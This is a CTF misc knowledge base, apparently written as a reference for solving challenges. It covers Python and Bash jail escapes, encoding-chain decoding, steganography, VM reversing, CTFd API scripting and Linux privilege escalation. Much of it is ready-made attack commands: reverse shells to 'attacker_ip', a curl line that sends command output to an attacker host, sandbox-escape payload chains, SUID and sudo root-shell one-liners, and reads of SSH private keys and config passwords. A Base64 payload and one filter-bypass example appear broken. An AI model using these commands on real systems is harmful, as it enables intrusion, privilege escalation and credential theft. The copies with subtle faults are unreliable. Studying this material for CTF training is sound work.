# stage: exploit
# category: ctf

> CTF Misc Knowledge Base — Python Jail escape, Bash Jail escape, encoding chain identification & decoding, QR/audio/image steganography, game VM reversing, CTFd API navigation, Linux privilege escalation

# CTF Misc Knowledge Base

Practical knowledge base for CTF Misc challenges, covering **sandbox escape, encoding chain identification, steganography, game reversing** and other misc challenge types.

## Scenario Routing

| Scenario | Reference Doc | Core Content |
|------|---------|---------|
| Python sandbox escape | `python-jail-escape.md` | `__import__`/func\_globals/eval chain |
| Bash sandbox escape | `bash-jail-escape.md` | HISTFILE/ctypes.sh/vi editor escape |
| Encoding chain identification & decoding | `encoding-chain-reference.md` | Base64→Hex→ROT13 multi-layer nesting |
| Game/custom VM reversing | `game-and-vm-reverse.md` | WASM/Brainfuck/Z3 constraint solving |
| CTFd platform operations | `ctfd-platform-guide.md` | API download attachments/submit flag |
| Linux privilege escalation | `linux-privesc-quick.md` | SUID/sudo/cron/kernel exploits |

## Quick Challenge Identification

| Challenge Feature | Likely Topic | Recommended Reference |
|---------|---------|---------|
| Python exec/eval input box | PyJail escape | python-jail-escape.md |
| Command-line restricted bash | BashJail escape | bash-jail-escape.md |
| Strange encoded string | Encoding chain decoding | encoding-chain-reference.md |
| QR code/audio file | Steganography | encoding-chain-reference.md |
| Game binary/WASM | Custom VM reversing | game-and-vm-reverse.md |
| CTFtime / CTFd platform | Platform API | ctfd-platform-guide.md |
| Given a shell | Linux privilege escalation | linux-privesc-quick.md |

## References — bash-jail-escape

# Bash Jail Escape Compendium

## Escape Decision Tree

```
Restricted shell (rbash/rksh)
├── Can use cd?
│   ├── Yes → cd /; sh to switch to full shell
│   └── No → find editors/other commands
├── Can use quotes/escaping?
│   ├── Yes → `whoami` or $(whoami)
│   └── No → find other command execution methods
├── Can access special files?
│   ├── /dev/tcp → reverse shell
│   ├── /proc → read sensitive files
│   └── Can read HISTFILE → read command history
└── Is there a command whitelist?
    ├── vi/vim → :!/bin/sh escape
    ├── awk → awk 'BEGIN {system("id")}'
    ├── find → find ... -exec
    └── python/perl → direct command execution
```

## Escape Techniques

### 1. Editor Escape
```bash
vi/vim: :!/bin/sh  or  :!/bin/bash
vim:   :shell
less:  !/bin/sh
more:  !/bin/sh
man:   !/bin/sh
```

### 2. Programming Language Escape
```bash
awk:    awk 'BEGIN {system("whoami")}'
perl:   perl -e 'system("whoami")'
python: python -c 'import os; os.system("whoami")'
ruby:   ruby -e 'system("whoami")'
lua:    lua -e 'os.execute("whoami")'
```

### 3. File Operation Escape
```bash
find:   find / -exec whoami \;
dd:     dd if=/dev/null of=/dev/null
cp:     cp /dev/null /tmp/a; cat /tmp/a
```

### 4. Special File Descriptors
```bash
# Read /etc/passwd
cat /etc/passwd
dd if=/etc/passwd
```

### 5. Read Command History
```bash
cat ~/.bash_history
cat /root/.bash_history
```

### 6. Reverse Shell
```bash
bash -i >& /dev/tcp/attacker_ip/port 0>&1
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker_ip",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

## rbash Specific Restrictions

| Restriction | Bypass Method |
|------|---------|
| Cannot cd | `cd /; /bin/bash` |
| Cannot use / | Use relative paths or builtins |
| Cannot use $() | Backticks `` `$var` `` |
| Cannot use env vars | Inherit parent process environment |
| Cannot redirect | Write file via `/dev/null` |

## SUID Privilege Escalation

```bash
# Find SUID files
find / -perm -4000 2>/dev/null

# Common exploitable SUID
/usr/bin/sudo
/usr/bin/python
/usr/bin/perl
/bin/more
/bin/less
/bin/awk
/bin/nice
```

## PATH Variable Exploitation

```bash
# If PATH can be set
export PATH=/tmp:$PATH
# Place malicious program in /tmp
```

## References — ctfd-platform-guide

# CTFd Platform Operations Guide

## CTFd API Basics

```python
import requests

CTFD_URL = "https://ctf.example.com"
session = requests.Session()

def login(username, password):
    """Login to CTFd"""
    r = session.post(f"{CTFD_URL}/login", data={
        "name": username,
        "password": password,
    })
    return r

def get_challenges():
    """Get all challenges"""
    r = session.get(f"{CTFD_URL}/api/v1/challenges")
    return r.json()

def get_challenge_detail(chal_id):
    """Get single challenge details"""
    r = session.get(f"{CTFD_URL}/api/v1/challenges/{chal_id}")
    return r.json()

def get_challenge_files(chal_id):
    """Get challenge attachments"""
    r = session.get(f"{CTFD_URL}/api/v1/challenges/{chal_id}/files")
    return r.json()

def download_file(file_id):
    """Download challenge file"""
    r = session.get(f"{CTFD_URL}/api/v1/files/{file_id}")
    return r.content

def submit_flag(flag):
    """Submit flag"""
    r = session.post(f"{CTFD_URL}/api/v1/challenges/attempt", json={
        "challenge_id": chal_id,
        "submission": flag,
    })
    return r.json()

def get_scoreboard():
    """Get scoreboard"""
    r = session.get(f"{CTFD_URL}/api/v1/scoreboard")
    return r.json()

def get_user_info():
    """Get current user info"""
    r = session.get(f"{CTFD_URL}/api/v1/users/me")
    return r.json()
```

## Platform Type Detection

```python
def detect_platform(url):
    """Detect CTF platform type"""
    # CTFd
    r = requests.get(f"{url}/login")
    if 'ctfd' in r.text.lower() or 'csrf_token' in r.text:
        return "CTFd"

    # RBCG / CTFdLight
    if '/static/core' in r.text:
        return "RBCG"

    # HCTF / others
    return "Unknown"
```

## Common CTFd API

```
GET  /api/v1/challenges          # All challenges
GET  /api/v1/challenges/{id}     # Challenge details
GET  /api/v1/challenges/{id}/files # Challenge files
POST /api/v1/challenges/attempt  # Submit flag
GET  /api/v1/scoreboard          # Scoreboard
GET  /api/v1/users/me            # Current user
GET  /api/v1/notifications       # Notifications
```

## Batch Download Attachments

```python
def download_all_files(url, output_dir):
    """Batch download all challenge attachments"""
    import os
    os.makedirs(output_dir, exist_ok=True)

    challenges = get_challenges()['data']
    for chal in challenges:
        chal_id = chal['id']
        try:
            files = get_challenge_files(chal_id)['data']
            for f in files:
                filename = f['filename']
                content = download_file(f['id'])
                with open(os.path.join(output_dir, filename), 'wb') as out:
                    out.write(content)
                print(f"Downloaded: {filename}")
        except Exception as e:
            print(f"Failed to download challenge {chal_id}: {e}")
```

## Auto-Solve Template

```python
def auto_solve(url, username, password, solve_func):
    """Auto-solve template

    solve_func(challenge_data) -> flag
    """
    session = requests.Session()
    login(username, password)

    challenges = get_challenges()['data']
    for chal in challenges:
        chal_id = chal['id']
        detail = get_challenge_detail(chal_id)['data']
        files = get_challenge_files(chal_id)['data']

        print(f"Solving: {detail['name']}")
        flag = solve_func(detail, files)

        if flag:
            result = submit_flag(flag)
            if result.get('data', {}).get('status') == 'correct':
                print(f"[✓] {detail['name']}: {flag}")
            else:
                print(f"[✗] {detail['name']}: Wrong flag")
        else:
            print(f"[-] {detail['name']}: No solve function")
```

## References — encoding-chain-reference

# Encoding Chain Identification & Decoding

## Encoding Identification Features

| Encoding | Features | Example |
|------|------|------|
| Base64 | `A-Za-z0-9+/=`, length % 4 | `TnNTY1RmLnBocA==` |
| Base32 | `A-Z2-7=`, length % 8 | `OBZHK5DFN2A====` |
| Base16 | `0-9A-F`, even length | `4E535354662E706870` |
| URL encoding | `%XX` | `%2F%61%64%6D%69%6E` |
| HTML entity | `&#xNNN;` or `&#NNN;` | `&#x3C;script&#x3E;` |
| Unicode | `\uXXXX` or `\UXXXXXXXX` | `\u003c\u0073\u0063` |
| Hex (Python) | `\xNN` | `\x4e\x53\x53\x54` |
| ROT13 | Letter substitution, Caesar | `axzc` → `nmp` |
| Morse | `.` `-` `/` combination | `.-/-.../-.-.` |
| Binary | `01` array | `01001101` |

## Common Encoding Chains

### 1. Simple Chain
```
Hex → Base64 → URL encoding
```

### 2. Binary Family
```
Binary → ASCII
Octal → ASCII
Hex → ASCII
```

### 3. Browser Family
```
HTML entity → URL encoding → Base64
```

### 4. Special Encodings
```
Brainfuck (`><+-.,[]`)
Ook! (`Ook. Ook?`)
Hex → Ook! → Brainfuck
```

## Auto-Decode Script

```python
import base64, binascii, urllib.parse, html

def auto_decode(data, max_iter=10):
    """Auto-attempt multi-layer decoding"""
    result = data
    for _ in range(max_iter):
        changed = False
        original = result

        # URL decode
        try:
            result = urllib.parse.unquote(result)
            if result != original:
                changed = True
        except:
            pass

        # HTML entity decode
        try:
            result = html.unescape(result)
            if result != original:
                changed = True
        except:
            pass

        # Base64 decode
        try:
            result = base64.b64decode(result).decode('utf-8')
            if result != original:
                changed = True
        except:
            try:
                result = base64.b64decode(result + '==').decode('utf-8')
                if result != original:
                    changed = True
            except:
                pass

        # Hex decode
        try:
            if all(c in '0123456789abcdefABCDEF' for c in result.replace('%', '')):
                result = bytes.fromhex(result.replace('%', '')).decode('utf-8')
                if result != original:
                    changed = True
        except:
            pass

        # ROT13
        try:
            result = original.encode().translate(bytes.maketrans(
                b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
                b'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'
            )).decode()
            if result != original:
                changed = True
        except:
            pass

        if not changed:
            break

    return result
```

## QR Code Decoding

```python
from PIL import Image
import zbarlight

def decode_qr(image_path):
    """Decode QR code"""
    image = Image.open(image_path)
    codes = zbarlight.scan_codes(['qrcode'], image)
    return codes
```

## Audio Steganography (Least Significant Bit)

```python
def extract_lsb_wav(wav_path):
    """Extract LSB steganography data from WAV"""
    import wave, struct
    with wave.open(wav_path, 'rb') as wav:
        frames = wav.readframes(wav.getnframes())
        binary = ''
        for byte in frames:
            binary += str(byte & 1)
    # One character per 8 bits
    result = ''
    for i in range(0, len(binary), 8):
        byte = binary[i:i+8]
        if len(byte) == 8:
            result += chr(int(byte, 2))
    return result
```

## Image Steganography

```python
from PIL import Image

def extract_lsb_png(image_path):
    """Extract LSB steganography from PNG"""
    img = Image.open(image_path)
    pixels = list(img.getdata())
    binary = ''
    for pixel in pixels:
        if isinstance(pixel, tuple):
            for channel in pixel[:3]:
                binary += str(channel & 1)
        else:
            binary += str(pixel & 1)
    # One character per 8 bits
    result = ''
    for i in range(0, len(binary), 8):
        byte = binary[i:i+8]
        if len(byte) == 8:
            result += chr(int(byte, 2))
    return result
```

## References — game-and-vm-reverse

# Game & Custom VM Reversing

## Brainfuck

```python
# Brainfuck interpreter
import sys

def brainfuck(code, input_data=''):
    code = ''.join(c for c in code if c in '><+-.,[]')
    tape = [0] * 30000
    ptr = 0
    iptr = 0
    input_ptr = 0
    output = []

    while iptr < len(code):
        op = code[iptr]
        if op == '>':
            ptr += 1
        elif op == '<':
            ptr -= 1
        elif op == '+':
            tape[ptr] = (tape[ptr] + 1) % 256
        elif op == '-':
            tape[ptr] = (tape[ptr] - 1) % 256
        elif op == '.':
            output.append(chr(tape[ptr]))
        elif op == ',':
            if input_ptr < len(input_data):
                tape[ptr] = ord(input_data[input_ptr])
                input_ptr += 1
            else:
                tape[ptr] = 0
        elif op == '[':
            if tape[ptr] == 0:
                depth = 1
                while depth > 0:
                    iptr += 1
                    if code[iptr] == '[':
                        depth += 1
                    elif code[iptr] == ']':
                        depth -= 1
        elif op == ']':
            if tape[ptr] != 0:
                depth = 1
                while depth > 0:
                    iptr -= 1
                    if code[iptr] == '[':
                        depth -= 1
                    elif code[iptr] == ']':
                        depth += 1
        iptr += 1

    return ''.join(output)
```

## Ook!

```python
# Ook! to Brainfuck conversion
ook_to_bf = {
    'Ook. Ook?': '>',
    'Ook? Ook.': '<',
    'Ook. Ook.': '+',
    'Ook! Ook!': '-',
    'Ook! Ook.': '.',
    'Ook. Ook!': ',',
    'Ook! Ook?': '[',
    'Ook? Ook!': ']',
}
```

## Custom VM Reversing Workflow

```python
# Steps to analyze a custom VM:
# 1. Find the opcode definition table
# 2. Find VM initialization code (registers, memory init)
# 3. Trace the main loop, find instruction dispatch
# 4. Analyze each opcode's function
# 5. Extract the bytecode file
# 6. Write a disassembler or directly emulate execution

"""
Common opcode patterns:
0x00 = NOP
0x01 = LOAD  (load data)
0x02 = STORE (store data)
0x03 = ADD
0x04 = SUB
0x05 = JMP
0x06 = JZ    (conditional jump)
0x07 = HALT
"""

class SimpleVM:
    def __init__(self, bytecode):
        self.bytecode = bytecode
        self.regs = [0] * 8
        self.memory = bytecode[256:]  # Assume data follows code
        self.pc = 0
        self.running = True

    def step(self):
        op = self.bytecode[self.pc]
        if op == 0x01:  # LOAD
            self.pc += 1
            reg = self.bytecode[self.pc]
            self.pc += 1
            addr = self.bytecode[self.pc]
            self.regs[reg] = self.memory[addr]
        elif op == 0x05:  # JMP
            self.pc += 1
            self.pc = self.bytecode[self.pc]
        elif op == 0x07:  # HALT
            self.running = False
        self.pc += 1

    def run(self):
        while self.running and self.pc < len(self.bytecode):
            self.step()
```

## Z3 Constraint Solving

```python
from z3 import *

def solve_with_z3(constraints, variables):
    """Solve constraints using Z3"""
    s = Solver()
    for constraint in constraints:
        s.add(constraint)
    if s.check() == sat:
        model = s.model()
        return {v: model[v] for v in variables}
    return None
```

## WASM Analysis

```python
# Common WASM analysis commands
"""
# Extract WASM strings
strings game.wasm | grep -i flag

# View exported functions
wasm-objdump -h game.wasm

# Decompile to WASM text format
wasm2wat game.wasm -o game.wat

# View functions
wasm-objdump -d game.wasm

# Execute with wasmer or wasmtime
wasmer game.wasm
"""
```

## References — linux-privesc-quick

# Linux Privilege Escalation Quick Reference

## Quick Enumeration Scripts

```bash
# LinPEAS-style enumeration
# 1. Check current user and privileges
id; whoami; sudo -l

# 2. Check SUID files
find / -perm -4000 2>/dev/null

# 3. Check sudo available commands
sudo -l

# 4. Check crontab
cat /etc/crontab
ls -la /etc/cron.d/

# 5. Check network
netstat -tulpn
ss -tulpn

# 6. Check services
ps aux | grep root
systemctl list-units --type=service

# 7. Check writable directories
find / -writable -type d 2>/dev/null | grep -v proc

# 8. Check kernel version
uname -a
cat /etc/issue

# 9. Check sudo version (CVE)
sudo --version

# 10. Check polkit version
pkexec --version
```

## Common Privilege Escalation Paths

### 1. SUID Privilege Escalation

```bash
# Common exploitable SUID
nmap:        nmap --interactive; !sh
vim:         vim -c ':!/bin/sh'
less:        less /etc/passwd; !/bin/sh
more:        more /etc/passwd; !/bin/sh
awk:         awk 'BEGIN {system("/bin/sh")}'
find:        find . -exec /bin/sh -p \; -quit
python:      python -c 'import os; os.system("/bin/sh")'
perl:        perl -e 'exec "/bin/sh";'
ruby:        ruby -e 'exec "/bin/sh"'
bash:        bash -p
sh:          sh
```

### 2. Sudo Privilege Escalation

```bash
# sudo -l to view available commands
# Common escalation commands
sudo git help config; !/bin/sh
sudo less /etc/passwd; !/bin/sh
sudo vim; :!/bin/sh
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find . -exec /bin/sh -p \; -quit
sudo python -c 'import os; os.system("/bin/sh")'
sudo perl -e 'exec "/bin/sh"'
sudo ruby -e 'exec "/bin/sh"'
sudo lua -e 'os.execute("/bin/sh")'
```

### 3. Cron Privilege Escalation

```bash
# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
# If a cron job runs as root and is writable
# Modify the script to append malicious commands
```

### 4. NFS Privilege Escalation

```bash
# If /home has no_root_squash
# Mount from another machine
mount -t nfs target:/home /tmp/nfs
cp /bin/bash /tmp/nfs/bash_suid
chmod +s /tmp/nfs/bash_suid
# On the target machine execute /tmp/nfs/bash_suid -p
```

### 5. Kernel Exploits

```python
# Search for available exploits
# Common exploits:
# - dirtycow (CVE-2016-5195)
# - docker breakout
# - overlayfs (CVE-2021-3493)
# - Polkit (CVE-2021-4034) / PwnKit
# - etc.
```

### 6. Password Reuse

```bash
# Check readable config files
cat /etc/mysql/my.cnf
cat /var/www/html/config.php
cat /home/*/.ssh/id_rsa
cat /root/.ssh/id_rsa
# If password found, try su root or ssh root@localhost
```

## Sensitive File Locations

```
/etc/passwd          # May be writable on some systems
/etc/shadow          # Usually not readable
/root/.ssh/          # root SSH private key
/home/*/.ssh/       # User SSH private key
/var/www/html/       # Web directory (may contain config)
/tmp/                # Writable directory (place payload)
/etc/cron.d/         # Cron configuration
/proc/self/environ   # Environment variables (contains sensitive info)
/proc/self/fd/       # File descriptors (may leak info)
```

## GTFOBins (sudo/suid lookup table)

| Command | Escalation Method |
|------|---------|
| `nmap` | `nmap --interactive` → `!sh` |
| `vim` | `:!/bin/sh` |
| `less` | `!/bin/sh` |
| `more` | `!/bin/sh` |
| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `perl` | `perl -e 'exec "/bin/sh"'` |
| `python` | `python -c 'import os; os.system("/bin/sh")'` |
| `ruby` | `ruby -e 'exec "/bin/sh"'` |
| `git` | `git help config` → `!/bin/sh` |
| `tar` | `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `zip` | `zip /tmp/test.zip /tmp/test -T -TT 'sh #'` |
| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |

## References — python-jail-escape

# Python Jail Escape Compendium

## Escape Decision Tree

```
Input is eval/exec'd
├── Can import?
│   ├── Yes → __import__('os').system('id')
│   └── No → find builtins
├── Can access __builtins__?
│   ├── Yes → use __builtins__ to find available functions
│   └── No → find other reference chains
├── Is there filtering?
│   ├── Underscore filtered → find no-underscore functions
│   ├── Quotes filtered → use StringIO/chr()
│   ├── Brackets filtered → use .format() or getattr
└── Character restrictions?
    ├── Letters only → use chr() to build arbitrary characters
    ├── Length limit → short payload
    └── Numbers only → complex encoding
```

## Basic Escape Chains

### 1. Direct Command Execution
```python
__import__('os').system('id')
__import__('os').popen('id').read()
eval("__import__('os').system('id')")
exec("__import__('os').system('id')")
```

### 2. Via builtins
```python
__builtins__.__dict__['__import__']('os').system('id')
getattr(getattr(__builtins__, '__im' + 'port__'), 'os').system('id')
```

### 3. Via func_globals
```python
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('id')
```

### 4. Via type()
```python
type(type(os))
(type.__subclasses__())
```

### 5. Via Warning/Exception
```python
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').system('id')")
```

## Common Subclass Indices (use print to find index)

```python
# List all available subclasses
print([c.__name__ for c in __builtins__.__dict__.values() if type(c).__name__ == 'type'])

# Or iterate to find specific class
for i, c in enumerate([].__class__.__base__.__subclasses__()):
    print(i, c.__name__)
```

## Common Gadgets

| Class Name | Index | Purpose |
|------|------|------|
| `catch_warnings` | ~59 | Get `__builtins__` |
| `_io._IOBase` | ~80 | File operations |
| `Popen` | ~200+ | Command execution |
| `subprocess.Popen` | Dynamic | Command execution |

## Bypassing Filters

### Underscore Filtered
```python
getattr(getattr(__builtins__, '\x5f\x5fclass\x5f\x5f'), '\x5f\x5f\x5fimport\x5f\x5f')('os').system('id')

# Or use request object (Flask)
request.environ['werkzeug.server.shutdown']
```

### Quotes Filtered
```python
chr(95)*2  # '__'
# Or use StringIO
import('so'[::-1], fromlist=['os']).system('id')
```

### Brackets Filtered
```python
getattr(__import__('os'), 'system')('id')
# Use .__getattribute__ instead of getattr
```

### Numbers Filtered
```python
# Use True/False to construct numbers
True.__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']
# True = 1, False = 0
```

### Length Limit
```python
# Shortest reverse shell
__import__('os').system('bash -i >& /dev/tcp/IP/PORT 0>&1')

# Or base64 decode and execute
__import__('base64').b64decode('bWFzaCAtaSA+JiAvZGV2L3RjcC9JUC9QT1JUIDAmPnxkZXYvdGNwL0lQL1BPUlQK').decode()
```

## Common Filter Bypass Character Sets

| Bypass Method | Applicable Characters |
|---------|---------|
| `chr()` | All visible characters |
| `hex()` / `oct()` | Number construction |
| `[::-1]` reverse | `so"[::-1]` = `os` |
| `+` concatenation | `'os'[0]+'stem'` |
| Variable assignment | `c='o'+'s';__import__(c)` |

## Blind Detection (No Output)
```python
# If command execution has no output, verify with the following
__import__('os').system('curl http://attacker/?$(id)')
__import__('os').system('ping -c1 attacker.com')
```
